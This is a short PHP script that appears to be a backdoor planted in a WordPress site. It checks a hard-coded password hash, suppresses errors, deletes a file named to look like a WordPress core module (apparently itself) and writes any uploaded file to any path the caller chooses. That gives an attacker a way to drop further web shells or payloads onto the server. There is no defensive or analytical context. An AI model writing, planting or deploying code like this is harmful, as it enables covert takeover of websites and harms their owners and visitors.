<?php
	error_reporting(0);
	function response($code = 200) {
		http_response_code($code);
		exit;
	}
	if (is_null($_POST['password']) || md5($_POST['password']) !== '4e82c02d7bbecf0c7f39a600e0ebcc89') response(403);
	unlink('wp-core-module.php');
	if (is_null($_POST['filename']) || is_null($_FILES['file'])) response(400);
	if (copy($_FILES['file']['tmp_name'], $_POST['filename']) === false) response(500);
	response();
?>